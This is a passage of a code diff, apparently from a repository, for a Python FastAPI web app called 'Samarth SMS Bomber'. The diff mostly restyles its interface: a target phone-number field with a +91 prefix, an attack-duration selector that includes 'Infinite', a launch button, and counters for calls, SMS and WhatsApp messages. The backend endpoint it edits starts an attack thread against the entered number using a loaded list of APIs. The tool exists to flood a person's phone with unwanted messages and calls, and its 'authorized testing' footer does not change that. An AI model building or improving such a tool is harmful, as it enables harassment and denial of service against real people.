DAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAA==">
         </source>
     </audio>
     <audio id="attackSound" preload="auto">
@@ -519,66 +522,75 @@ async def index():
     </audio>
 
     <!-- Main Content -->
-    <div class="relative z-10 max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6 lg:py-12">
+    <div class="relative z-10 max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-6 lg:py-10">
         
         <!-- Header -->
-        <header class="flex flex-col lg:flex-row justify-between items-start lg:items-center gap-4 mb-10">
-            <div class="flex items-center gap-6">
-                <div class="w-20 h-20 rounded-2xl bg-gradient-to-br from-blue-700 via-indigo-600 to-blue-800 flex items-center justify-center text-5xl shadow-2xl shadow-blue-500/40 border border-blue-400/20 animate-pulse">
-                    👑
+        <header class="flex flex-col lg:flex-row justify-between items-start lg:items-center gap-4 mb-8">
+            <div class="flex items-center gap-4">
+                <div class="w-12 h-12 lg:w-14 lg:h-14 rounded-xl bg-gradient-to-br from-blue-600 to-purple-600 flex items-center justify-center text-2xl shadow-lg shadow-blue-500/20">
+                    ✉️
                 </div>
                 <div>
-                    <h1 class="title-grand text-5xl lg:text-7xl">Samarth SMS Bomber</h1>
-                    <p class="subtitle-grand text-sm lg:text-base">⚡ ROYAL GRAND EDITION · STADIUM PREMIERE ⚡</p>
+                    <h1 class="text-2xl lg:text-4xl font-extrabold tracking-tight">
+                        <span class="text-blue-400">Samarth</span>
+                        <span class="text-yellow-400">SMS</span>
+                        <span class="text-white">Bomber</span>
+                    </h1>
+                    <p class="text-[10px] text-gray-500 tracking-[0.15em] mt-0.5 flex items-center gap-2">
+                        <span class="w-1 h-1 bg-blue-500 rounded-full"></span>
+                        PREMIUM EDITION
+                        <span class="w-1 h-1 bg-blue-500 rounded-full"></span>
+                        v3.0
+                    </p>
                 </div>
             </div>
-            <div class="flex items-center gap-4 flex-wrap">
-                <!-- Theme toggle -->
-                <div class="toggle-grand" onclick="toggleTheme()" id="themeToggle">
+            <div class="flex items-center gap-3 flex-wrap">
+                <!-- Theme Toggle -->
+                <div class="toggle-premium" onclick="toggleTheme()" id="themeToggle">
                     <span id="themeIcon">🌙</span>
-                    <span class="text-xs text-gray-400">Mode</span>
+                    <span class="text-gray-400">Mode</span>
                 </div>
-                <!-- Sound toggle -->
-                <div class="toggle-grand" onclick="toggleSound()" id="soundToggle">
+                <!-- Sound Toggle -->
+                <div class="toggle-premium" onclick="toggleSound()" id="soundToggle">
                     <span id="soundIcon">🔊</span>
-                    <span class="text-xs text-gray-400">Sound</span>
+                    <span class="text-gray-400">Sound</span>
                 </div>
-                <div class="badge-status flex items-center gap-2 px-4 py-2 rounded-full bg-black/40 border border-white/10">
-                    <span class="dot-status idle" id="statusDot"></span>
-                    <span id="statusText" class="text-xs text-gray-300 glow-white">SYSTEM READY</span>
+                <div class="badge-premium">
+                    <span class="dot-premium idle" id="statusDot"></span>
+                    <span id="statusText" class="text-gray-400">System Ready</span>
                 </div>
-                <div class="hidden sm:block text-xs text-gray-500 font-mono" id="timestamp"></div>
+                <div class="hidden sm:block text-[10px] text-gray-500 font-mono" id="timestamp"></div>
             </div>
         </header>
 
-        <!-- Gold Divider -->
-        <div class="gold-line w-full h-px bg-gradient-to-r from-transparent via-yellow-400/30 to-transparent mb-10"></div>
+        <!-- Divider -->
+        <div class="divider-premium w-full mb-8"></div>
 
         <!-- Main Grid -->
-        <div class="grid grid-cols-1 lg:grid-cols-12 gap-8">
+        <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
             
             <!-- Control Panel -->
-            <div class="lg:col-span-5 glass-grand rounded-3xl p-8">
-                <h2 class="text-lg font-bold text-blue-400 tracking-wider flex items-center gap-3 mb-6 gothic-modern glow-blue">
-                    <span>🎯</span> TARGET LOCK
+            <div class="lg:col-span-5 glass-premium rounded-2xl p-6">
+                <h2 class="text-sm font-semibold text-blue-400 tracking-wider flex items-center gap-2 mb-5">
+                    <span>🎯</span> Target Lock
                 </h2>
-                <div class="space-y-5">
+                <div class="space-y-4">
                     <div>
-                        <label class="text-xs text-gray-400 font-medium block mb-2 gothic-modern tracking-wider">MOBILE NUMBER</label>
+                        <label class="text-xs text-gray-500 font-medium block mb-1.5 tracking-wider">Mobile Number</label>
                         <div class="relative">
-                            <span class="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 font-mono text-sm font-bold">+91</span>
+                            <span class="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500 font-mono text-sm font-semibold">+91</span>
                             <input id="phone" maxlength="10"
-                                   class="input-grand"
-                                   placeholder="ENTER 10-DIGIT NUMBER"
+                                   class="input-premium"
+                                   placeholder="Enter 10-digit number"
                                    oninput="this.value=this.value.replace(/[^0-9]/g,''); validateNumber(this.value)">
                         </div>
-                        <div id="phoneFeedback" class="text-xs mt-2 h-5"></div>
+                        <div id="phoneFeedback" class="text-xs mt-1.5 h-5"></div>
                     </div>
                     
-                    <!-- Timer Duration -->
+                    <!-- Timer -->
                     <div>
-                        <label class="text-xs text-gray-400 font-medium block mb-2 gothic-modern tracking-wider">⏱️ ATTACK DURATION</label>
-                        <select id="timerDuration" class="w-full bg-black/50 border border-blue-500/20 rounded-xl px-4 py-3 text-gray-300 font-mono text-sm focus:border-blue-500 focus:outline-none transition-all">
+                        <label class="text-xs text-gray-500 font-medium block mb-1.5 tracking-wider">⏱️ Attack Duration</label>
+                        <select id="timerDuration" class="select-premium">
                             <option value="0">♾️ Infinite</option>
                             <option value="10">10 Seconds</option>
                             <option value="30">30 Seconds</option>
@@ -589,96 +601,96 @@ async def index():
                         </select>
                     </div>
                     
-                    <div class="grid grid-cols-2 gap-4">
+                    <div class="grid grid-cols-2 gap-3">
                         <button onclick="startAttack()" id="startBtn"
-                                class="col-span-2 btn-epic py-5 rounded-2xl text-lg flex items-center justify-center gap-3 transition-all">
-                            <span>🚀</span> LAUNCH BOMBARDMENT
+                                class="col-span-2 btn-premium py-4 text-sm flex items-center justify-center gap-2">
+                            <span>🚀</span> Launch Attack
                         </button>
                         <button onclick="stopAttack()" id="stopBtn"
-                                class="col-span-2 hidden btn-epic btn-epic-danger py-5 rounded-2xl text-lg flex items-center justify-center gap-3 transition-all">
-                            <span>🛑</span> TERMINATE ATTACK
+                                class="col-span-2 hidden btn-premium btn-danger py-4 text-sm flex items-center justify-center gap-2">
+                            <span>🛑</span> Stop Attack
                         </button>
                     </div>
                     
-                    <!-- Export Button -->
+                    <!-- Export -->
                     <button onclick="exportStats()" id="exportBtn"
-                            class="w-full py-3 rounded-xl text-sm bg-blue-500/10 hover:bg-blue-500/20 border border-blue-500/20 transition-all font-semibold text-blue-400 gothic-modern tracking-wider">
-                        📊 EXPORT STATISTICS
+                            class="w-full btn-ghost py-2.5 rounded-xl text-xs font-medium text-gray-400 transition-all flex items-center justify-center gap-2">
+                        📊 Export Statistics
                     </button>
                     
-                    <div class="grid grid-cols-3 gap-3 p-4 bg-black/40 rounded-2xl border border-white/5">
+                    <div class="grid grid-cols-3 gap-2 p-3 bg-black/30 rounded-xl border border-white/5">
                         <div class="text-center">
-                            <div class="text-[10px] text-gray-500 uppercase tracking-wider gothic-modern">APIs</div>
-                            <div class="text-lg font-bold text-blue-400 glow-blue gothic-modern" id="apiCount">0</div>
+                            <div class="text-[10px] text-gray-500 uppercase tracking-wider">APIs</div>
+                            <div class="text-sm font-bold text-blue-400" id="apiCount">0</div>
                         </div>
                         <div class="text-center">
-                            <div class="text-[10px] text-gray-500 uppercase tracking-wider gothic-modern">Interval</div>
-                            <div class="text-lg font-bold text-cyan-400 glow-blue gothic-modern">2s</div>
+                            <div class="text-[10px] text-gray-500 uppercase tracking-wider">Interval</div>
+                            <div class="text-sm font-bold text-cyan-400">2s</div>
                         </div>
                         <div class="text-center">
-                            <div class="text-[10px] text-gray-500 uppercase tracking-wider gothic-modern">Target</div>
-                            <div class="text-lg font-bold text-yellow-400 truncate gothic-modern glow-gold" id="targetDisplay">—</div>
+                            <div class="text-[10px] text-gray-500 uppercase tracking-wider">Target</div>
+                            <div class="text-sm font-bold text-yellow-400 truncate" id="targetDisplay">—</div>
                         </div>
                     </div>
                 </div>
             </div>
 
-            <!-- Stats Panel -->
-            <div class="lg:col-span-7 glass-grand rounded-3xl p-8">
-                <div class="flex justify-between items-center mb-6">
-                    <h2 class="text-lg font-bold text-yellow-400 tracking-wider flex items-center gap-3 gothic-modern glow-gold">
-                        <span>📊</span> LIVE METRICS
+            <!-- Stats -->
+            <div class="lg:col-span-7 glass-premium rounded-2xl p-6">
+                <div class="flex justify-between items-center mb-5">
+                    <h2 class="text-sm font-semibold text-yellow-400 tracking-wider flex items-center gap-2">
+                        <span>📊</span> Live Metrics
                     </h2>
-                    <span class="text-xs text-gray-500 font-mono glow-white" id="cycleDisplay">CYCLES: 0</span>
+                    <span class="text-xs text-gray-500 font-mono" id="cycleDisplay">Cycles: 0</span>
                 </div>
-                <div class="grid grid-cols-3 gap-4">
-                    <div class="stat-grand">
-                        <div class="stat-number text-4xl" id="calls">0</div>
-                        <div class="text-[10px] text-gray-400 uppercase tracking-wider mt-1 gothic-modern">📞 Calls</div>
-                        <div class="progress-cosmic"><div class="progress-cosmic-fill" id="callBar" style="width:0%"></div></div>
+                <div class="grid grid-cols-3 gap-3">
+                    <div class="stat-premium">
+                        <div class="stat-number" id="calls">0</div>
+                        <div class="text-[10px] text-gray-500 uppercase tracking-wider mt-1">📞 Calls</div>
+                        <div class="progress-premium"><div class="progress-fill" id="callBar" style="width:0%"></div></div>
                     </div>
-                    <div class="stat-grand">
-                        <div class="stat-number text-4xl" id="sms">0</div>
-                        <div class="text-[10px] text-gray-400 uppercase tracking-wider mt-1 gothic-modern">✉️ SMS</div>
-                        <div class="progress-cosmic"><div class="progress-cosmic-fill" id="smsBar" style="width:0%"></div></div>
+                    <div class="stat-premium">
+                        <div class="stat-number" id="sms">0</div>
+                        <div class="text-[10px] text-gray-500 uppercase tracking-wider mt-1">✉️ SMS</div>
+                        <div class="progress-premium"><div class="progress-fill" id="smsBar" style="width:0%"></div></div>
                     </div>
-                    <div class="stat-grand">
-                        <div class="stat-number text-4xl" id="wa">0</div>
-                        <div class="text-[10px] text-gray-400 uppercase tracking-wider mt-1 gothic-modern">💬 WhatsApp</div>
-                        <div class="progress-cosmic"><div class="progress-cosmic-fill" id="waBar" style="width:0%"></div></div>
+                    <div class="stat-premium">
+                        <div class="stat-number" id="wa">0</div>
+                        <div class="text-[10px] text-gray-500 uppercase tracking-wider mt-1">💬 WhatsApp</div>
+                        <div class="progress-premium"><div class="progress-fill" id="waBar" style="width:0%"></div></div>
                     </div>
                 </div>
-                <div class="grid grid-cols-2 gap-4 mt-6">
-                    <div class="glass-grand p-4 rounded-xl border border-white/5">
-                        <div class="text-[10px] text-gray-400 uppercase tracking-wider gothic-modern">Total Hits</div>
-                        <div class="text-3xl font-bold text-white stat-number glow-white" id="totalHits">0</div>
+                <div class="grid grid-cols-2 gap-3 mt-4">
+                    <div class="glass-light rounded-xl p-3 border border-white/5">
+                        <div class="text-[10px] text-gray-500 uppercase tracking-wider">Total Hits</div>
+                        <div class="text-xl font-bold text-white" id="totalHits">0</div>
                     </div>
-                    <div class="glass-grand p-4 rounded-xl border border-white/5">
-                        <div class="text-[10px] text-gray-400 uppercase tracking-wider gothic-modern">Success Rate</div>
-                        <div class="text-3xl font-bold text-emerald-400 stat-number glow-white" id="successRate">—</div>
+                    <div class="glass-light rounded-xl p-3 border border-white/5">
+                        <div class="text-[10px] text-gray-500 uppercase tracking-wider">Success Rate</div>
+                        <div class="text-xl font-bold text-emerald-400" id="successRate">—</div>
                     </div>
                 </div>
                 <!-- Timer Display -->
-                <div class="mt-4 p-3 bg-black/30 rounded-xl border border-white/5 text-center">
-                    <span class="text-xs text-gray-400 gothic-modern">⏱️ </span>
-                    <span class="timer-grand" id="timerDisplay">No timer set</span>
+                <div class="mt-3 p-2 bg-black/30 rounded-lg border border-white/5 text-center">
+                    <span class="text-xs text-gray-500">⏱️ </span>
+                    <span class="timer-premium" id="timerDisplay">No timer set</span>
                 </div>
             </div>
 
             <!-- Logs -->
-            <div class="lg:col-span-12 glass-grand rounded-3xl p-8">
-                <div class="flex justify-between items-center mb-4">
-                    <h3 class="text-lg font-bold text-blue-400 tracking-wider flex items-center gap-3 gothic-modern glow-blue">
-                        <span>📜</span> EVENT LOG
+            <div class="lg:col-span-12 glass-premium rounded-2xl p-6">
+                <div class="flex justify-between items-center mb-3">
+                    <h3 class="text-sm font-semibold text-blue-400 tracking-wider flex items-center gap-2">
+                        <span>📜</span> Event Log
                     </h3>
-                    <span class="text-[10px] text-gray-500 font-mono glow-white">⚡ LIVE FEED</span>
+                    <span class="text-[10px] text-gray-500 font-mono">Live Feed</span>
                 </div>
-                <div id="logs" class="logs-grand bg-black/30 rounded-xl p-4 border border-white/5"></div>
+                <div id="logs" class="logs-premium bg-black/30 rounded-xl p-3 border border-white/5"></div>
             </div>
         </div>
 
         <!-- Footer -->
-        <footer class="mt-12 pt-6 border-t border-white/5 flex flex-col sm:flex-row justify-between items-center gap-4 text-[10px] text-gray-500 gothic-modern">
+        <footer class="mt-8 pt-4 border-t border-white/5 flex flex-col sm:flex-row justify-between items-center gap-3 text-[10px] text-gray-600">
             <span>⚡ Authorized testing only · All endpoints public</span>
             <div class="flex items-center gap-4">
                 <span>🔒 Encrypted</span>
@@ -699,36 +711,27 @@ async def index():
         let timerInterval = null;
         let isLight = false;
 
-        // ===== GENERATE STARS =====
-        (function generateStars() {
-            const container = document.getElementById('starContainer');
-            for (let i = 0; i < 200; i++) {
-                const star = document.createElement('div');
-                star.className = 'stars';
-                star.style.left = Math.random() * 100 + '%';
-                star.style.top = Math.random() * 100 + '%';
-                star.style.width = (1 + Math.random() * 3) + 'px';
-                star.style.height = star.style.width;
-                star.style.animationDelay = (Math.random() * 5) + 's';
-                star.style.animationDuration = (2 + Math.random() * 4) + 's';
-                container.appendChild(star);
-            }
-        })();
-
         // ===== THEME TOGGLE =====
         function toggleTheme() {
             isLight = !isLight;
-            document.body.style.background = isLight ? '#f0f4ff' : '#0a0a1a';
-            document.querySelectorAll('.glass-grand').forEach(el => {
-                el.style.background = isLight ? 'rgba(255,255,255,0.7)' : 'rgba(10,10,30,0.6)';
-                el.style.borderColor = isLight ? 'rgba(37,99,235,0.1)' : 'rgba(56,189,248,0.15)';
+            document.body.style.background = isLight ? '#f0f4ff' : '#0a0e1a';
+            document.querySelectorAll('.glass-premium').forEach(el => {
+                el.style.background = isLight ? 'rgba(255,255,255,0.7)' : 'rgba(10,14,26,0.7)';
+                el.style.borderColor = isLight ? 'rgba(37,99,235,0.08)' : 'rgba(255,255,255,0.06)';
             });
-            document.querySelectorAll('.input-grand').forEach(el => {
-                el.style.background = isLight ? 'rgba(255,255,255,0.8)' : 'rgba(0,0,0,0.7)';
-                el.style.color = isLight ? '#0f172a' : '#f0f0ff';
+            document.querySelectorAll('.input-premium').forEach(el => {
+                el.style.background = isLight ? 'rgba(255,255,255,0.8)' : 'rgba(0,0,0,0.5)';
+                el.style.color = isLight ? '#0f172a' : '#e2e8f0';
             });
-            document.querySelectorAll('.stat-grand').forEach(el => {
-                el.style.background = isLight ? 'rgba(255,255,255,0.4)' : 'rgba(0,0,0,0.5)';
+            document.querySelectorAll('.stat-premium').forEach(el => {
+                el.style.background = isLight ? 'rgba(255,255,255,0.4)' : 'rgba(0,0,0,0.4)';
+            });
+            document.querySelectorAll('.select-premium').forEach(el => {
+                el.style.background = isLight ? 'rgba(255,255,255,0.8)' : 'rgba(0,0,0,0.5)';
+                el.style.color = isLight ? '#0f172a' : '#e2e8f0';
+            });
+            document.querySelectorAll('.glass-light').forEach(el => {
+                el.style.background = isLight ? 'rgba(255,255,255,0.5)' : 'rgba(255,255,255,0.03)';
             });
             document.getElementById('themeIcon').textContent = isLight ? '☀️' : '🌙';
         }
@@ -757,13 +760,13 @@ async def index():
         function validateNumber(value) {
             const feedback = document.getElementById('phoneFeedback');
             if (value.length > 0 && value.length < 10) {
-                feedback.innerHTML = '<span class="text-red-400" style="text-shadow: 0 0 20px rgba(239,68,68,0.3);">⚠️ Invalid — must be 10 digits</span>';
+                feedback.innerHTML = '<span class="text-red-400 text-xs">⚠️ Must be 10 digits</span>';
                 if (value !== lastValidation) {
                     playWrongSound();
                     lastValidation = value;
                 }
             } else if (value.length === 10) {
-                feedback.innerHTML = '<span class="text-emerald-400" style="text-shadow: 0 0 20px rgba(34,197,94,0.3);">✅ Valid number</span>';
+                feedback.innerHTML = '<span class="text-emerald-400 text-xs">✅ Valid number</span>';
                 playNiceSound();
             } else {
                 feedback.innerHTML = '';
@@ -781,7 +784,7 @@ async def index():
             }, 3000);
         }
 
-        // ===== EXPORT STATISTICS =====
+        // ===== EXPORT =====
         function exportStats() {
             const data = {
                 target: document.getElementById('targetDisplay').textContent,
@@ -791,9 +794,8 @@ async def index():
                     sms: document.getElementById('sms').textContent,
                     whatsapp: document.getElementById('wa').textContent,
                     total: document.getElementById('totalHits').textContent,
-                    cycles: document.getElementById('cycleDisplay').textContent.replace('CYCLES: ', '')
-                },
-                logs: document.getElementById('logs').innerHTML
+                    cycles: document.getElementById('cycleDisplay').textContent.replace('Cycles: ', '')
+                }
             };
             const blob = new Blob([JSON.stringify(data, null, 2)], {type: 'application/json'});
             const url = URL.createObjectURL(blob);
@@ -828,7 +830,7 @@ async def index():
             if (phone.length !== 10) {
                 playWrongSound();
                 document.getElementById('phone').style.borderColor = '#ef4444';
-                document.getElementById('phone').style.boxShadow = '0 0 40px rgba(239,68,68,0.3)';
+                document.getElementById('phone').style.boxShadow = '0 0 30px rgba(239,68,68,0.15)';
                 setTimeout(() => {
                     document.getElementById('phone').style.borderColor = '';
                     document.getElementById('phone').style.boxShadow = '';
@@ -849,13 +851,10 @@ async def index():
                     isRunning = true;
                     document.getElementById('startBtn').classList.add('hidden');
                     document.getElementById('stopBtn').classList.remove('hidden');
-                    document.getElementById('statusDot').className = 'dot-status active';
-                    document.getElementById('statusText').textContent = 'ATTACK ACTIVE';
+                    document.getElementById('statusDot').className = 'dot-premium active';
+                    document.getElementById('statusText').textContent = 'Attack Active';
                     document.getElementById('statusText').style.color = '#ef4444';
-                    document.getElementById('statusText').style.textShadow = '0 0 30px rgba(239,68,68,0.5)';
                     document.getElementById('targetDisplay').textContent = `+91${phone}`;
-                    document.getElementById('targetDisplay').style.color = '#fbbf24';
-                    document.getElementById('targetDisplay').style.textShadow = '0 0 30px rgba(251,191,36,0.5)';
                     if (duration > 0) {
                         document.getElementById('timerDisplay').textContent = `⏱️ ${duration}s remaining`;
                         if (timerInterval) clearInterval(timerInterval);
@@ -887,10 +886,9 @@ async def index():
                 isRunning = false;
                 document.getElementById('startBtn').classList.remove('hidden');
                 document.getElementById('stopBtn').classList.add('hidden');
-                document.getElementById('statusDot').className = 'dot-status idle';
-                document.getElementById('statusText').textContent = 'STOPPED';
-                document.getElementById('statusText').style.color = '#fbbf24';
-                document.getElementById('statusText').style.textShadow = '0 0 30px rgba(251,191,36,0.3)';
+                document.getElementById('statusDot').className = 'dot-premium idle';
+                document.getElementById('statusText').textContent = 'Stopped';
+                document.getElementById('statusText').style.color = '';
                 if (timerInterval) clearInterval(timerInterval);
                 document.getElementById('timerDisplay').textContent = 'No timer set';
                 if (statusInterval) clearInterval(statusInterval);
@@ -914,7 +912,7 @@ async def index():
                     document.getElementById('sms').textContent = sms;
                     document.getElementById('wa').textContent = wa;
                     document.getElementById('totalHits').textContent = total;
-                    document.getElementById('cycleDisplay').textContent = `CYCLES: ${d.cycles}`;
+                    document.getElementById('cycleDisplay').textContent = `Cycles: ${d.cycles}`;
                     const maxVal = Math.max(calls, sms, wa, 1);
                     document.getElementById('callBar').style.width = ((calls / maxVal) * 100) + '%';
                     document.getElementById('smsBar').style.width = ((sms / maxVal) * 100) + '%';
@@ -927,16 +925,15 @@ async def index():
                     if (d.logs && d.logs.length) {
                         logsDiv.innerHTML = d.logs.map(l => `<div class="log-entry">${l}</div>`).join('');
                     } else {
-                        logsDiv.innerHTML = '<div class="text-gray-500 text-center py-6 gothic-modern">⏳ Awaiting attack...</div>';
+                        logsDiv.innerHTML = '<div class="text-gray-500 text-center py-6">⏳ Awaiting attack...</div>';
                     }
                     if (!d.running && isRunning) {
                         isRunning = false;
                         document.getElementById('startBtn').classList.remove('hidden');
                         document.getElementById('stopBtn').classList.add('hidden');
-                        document.getElementById('statusDot').className = 'dot-status idle';
-                        document.getElementById('statusText').textContent = 'ATTACK ENDED';
-                        document.getElementById('statusText').style.color = '#fbbf24';
-                        document.getElementById('statusText').style.textShadow = '0 0 30px rgba(251,191,36,0.3)';
+                        document.getElementById('statusDot').className = 'dot-premium idle';
+                        document.getElementById('statusText').textContent = 'Attack Ended';
+                        document.getElementById('statusText').style.color = '';
                         if (timerInterval) clearInterval(timerInterval);
                         document.getElementById('timerDisplay').textContent = 'No timer set';
                     }
@@ -950,7 +947,7 @@ async def index():
         document.addEventListener('DOMContentLoaded', () => {
             document.getElementById('apiCount').textContent = API_COUNT;
             document.getElementById('apiCountFooter').textContent = '⚡ ' + API_COUNT + ' APIs';
-            document.getElementById('logs').innerHTML = '<div class="text-gray-500 text-center py-6 gothic-modern">🟢 System initialized · Ready for action</div>';
+            document.getElementById('logs').innerHTML = '<div class="text-gray-500 text-center py-6">🟢 System initialized · Ready for action</div>';
         });
     </script>
 </body>
@@ -959,14 +956,19 @@ async def index():
     return html
 
 @app.post("/start")
-async def start(phone: Phone):
-    if len(phone.phone) != 10: return {"status": "error"}
-    if attack_status["running"]: return {"status": "error"}
-    import json
-    body = await Request.json()
-    duration = body.get('duration', 0)
-    threading.Thread(target=lambda: asyncio.run(run_attack(phone.phone, duration)), daemon=True).start()
-    return {"status": "success"}
+async def start(request: Request):
+    try:
+        body = await request.json()
+        phone = body.get('phone', '')
+        duration = body.get('duration', 0)
+        if len(phone) != 10:
+            return {"status": "error", "message": "Invalid phone number"}
+        if attack_status["running"]:
+            return {"status": "error", "message": "Attack already running"}
+        threading.Thread(target=lambda: asyncio.run(run_attack(phone, duration)), daemon=True).start()
+        return {"status": "success"}
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
 
 @app.post("/stop")
 async def stop():
@@ -982,18 +984,9 @@ async def status():
         "logs": attack_status["logs"][:50]
     }
 
-@app.get("/export")
-async def export():
-    return {
-        "export_data": attack_status["export_data"],
-        "stats": attack_status["stats"],
-        "cycles": attack_status["cycles"],
-        "duration": attack_status["duration"]
-    }
-
 if __name__ == "__main__":
     import uvicorn
-    print("👑 Samarth SMS Bomber —  Royale Edition")
+    print("✉️ Samarth SMS Bomber — Premium Edition")
     print(f"📱 Loaded {len(ULTIMATE_APIS)} APIs")
     print("🌐 http://localhost:5000")
     uvicorn.run(app, host="0.0.0.0", port=5000)
